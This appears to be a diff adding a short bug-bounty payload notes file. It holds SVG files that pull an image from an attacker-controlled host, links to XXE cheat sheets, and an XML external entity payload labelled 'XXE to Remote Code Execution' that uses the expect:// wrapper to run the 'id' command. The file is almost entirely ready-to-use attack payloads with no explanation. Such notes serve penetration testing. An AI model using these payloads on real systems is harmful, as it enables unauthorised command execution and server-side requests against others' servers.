@@ -1,0 +1,22 @@
+<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"> 
+<image height="30" width="30" 
+xlink:href="https://controlledserver.com/pic.svg" /> 
+</svg>
+
+<?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="200" width="200" xlink:href="http://<EXAMPLE_SERVER>/image.jpeg" /></svg>
+
+
+https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md
+
+https://0xmahmoudjo0.medium.com/exploiting-out-of-band-xxe-in-the-wild-16fc6dad9ee2 (xxe best writeup)
+
+XXE to Remote Code Execution:
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo
+  [<!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "expect://id" >]>
+<creds>
+  <user>`&xxe;`</user>
+  <pass>`mypass`</pass>
+</creds>
